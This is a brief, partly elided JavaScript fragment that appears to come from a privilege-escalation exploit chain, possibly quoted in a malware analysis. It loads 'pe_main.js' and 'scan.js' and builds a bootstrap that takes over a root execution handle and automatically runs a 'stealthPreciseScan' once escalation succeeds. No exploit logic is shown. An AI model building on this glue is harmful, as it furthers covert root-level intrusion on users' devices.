(() => {
  ...
  function spawn_pe() {
    ...
    if (integrated) {
      ...
      let pe_main_js_str = getJS('pe_main.js');
      let scan_js_str = getJS('scan.js');
      let bootstrap = `
// Case Analysis: Auto-trigger scan after privilege escalation
if (typeof root_exec !== 'undefined') {
    __native_root_exec = root_exec;
    if (typeof stealthPreciseScan === 'function') {
        stealthPreciseScan();
    }
}
`;
